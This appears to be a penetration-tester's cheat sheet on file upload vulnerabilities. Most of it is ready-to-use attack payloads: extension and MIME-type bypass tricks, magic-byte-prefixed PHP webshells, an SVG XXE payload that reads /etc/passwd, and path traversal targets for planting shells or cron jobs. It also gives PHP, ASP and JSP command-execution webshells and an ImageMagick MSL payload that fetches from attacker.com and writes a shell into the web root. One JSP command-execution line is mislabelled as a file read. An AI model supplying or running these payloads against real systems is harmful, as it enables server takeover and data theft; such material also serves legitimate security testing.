# File Upload Vulnerabilities: Complete Reference

## Bypass Techniques

### Extension Bypass
```bash
# Case variation
file.php, file.pHp, file.Php, file.PHP
file.PhP5, file.sHtMl, file.AsAx

# Double extension
file.php.jpg, file.jpg.php, file.php%00.jpg
file.php.;.jpg, file.php.jpg, file.php\x00.jpg

# Trailing dots/spaces
file.php., file.php , file.php%20
file.php%0d%0a.jpg, file.php%0a.jpg

# Null byte injection
file.php%00.jpg
file.asp%00.gif
file.aspx%00.png

# Reverse extension
file.jpg.php, file.png.php

# Executable extensions
.php, .php3, .php4, .php5, .phtml, .pht
.asp, .aspx, .asa, .cer, .cdx
.jsp, .jspx, .jsw, .jsv, .jspf
.cgi, .pl, .py, .rb
.shtml, .shtm
```

### Content-Type Manipulation
```bash
# Change MIME type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/pdf
Content-Type: application/octet-stream

# Multipart boundary manipulation
Content-Type: multipart/form-data; boundary=---WebKitFormBoundary

# Omit Content-Type entirely (some servers default to text/plain -> no validation)
```

### Magic Byte Injection
```python
# Add magic bytes to bypass content validation
# PNG header
png_code = b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>"

# GIF89a header
gif_header = b"GIF89a<?php system($_GET['cmd']); ?>"

# JPEG header
jpeg_header = b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>"
```

### SVG Upload (XXE + XSS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text y="20">&xxe;</text>
</svg>
```

## Server-Side Attacks

### Path Traversal
```bash
# Overwrite files via upload path
../../../var/www/html/shell.php
../../../etc/cron.d/malicious
../../../../var/www/html/index.php
../../../tmp/shell.php
```

### RCE via Uploaded File
```bash
# PHP: Webshell
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
<?= exec('whoami'); ?>

# ASP: Command execution
<% response.write CreateObject("WScript.Shell").Exec("cmd /c " &
   request.querystring("cmd")).StdOut.ReadAll() %>

# JSP: File read
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
```

### ImageTragick / ImageMagick
```xml
<!-- MSL file (ImageMagick Script Language) -->
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="https://attacker.com/evil.png" />
  <write filename="/var/www/html/shell.php" />
</image>
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| Upload shell -> RCE on server | 9.8 | Network, Low, No auth, Full impact |
| Upload SVG -> XXE -> file read | 7.5 | Network, Low, No auth, Confidentiality high |
| Upload -> path traversal overwrite index | 8.1 | Network, Low, No auth, Integrity high |
| Upload large file -> disk DoS | 5.3 | Network, Low, No auth, Availability only |
| Upload -> stored XSS in download | 6.1 | Network, Low, User interaction required |